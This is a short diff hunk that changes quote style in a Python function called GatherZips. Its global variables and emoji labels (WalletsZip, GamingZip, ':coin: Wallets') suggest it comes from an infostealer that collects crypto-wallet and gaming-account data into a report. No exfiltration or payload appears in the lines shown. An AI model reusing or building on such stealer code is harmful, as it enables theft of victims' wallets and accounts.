@@ -3528,7 +3528,7 @@ def GatherZips(paths1, paths2, paths3):
     try:
         global WalletsZip, GamingZip, OtherZip
         
-        wal, ga, ot = "",'',''
+        wal, ga, ot = '','',''
         if not len(WalletsZip) == 0:
             wal = ":coin:  •  Wallets\n"
             for i in WalletsZip:
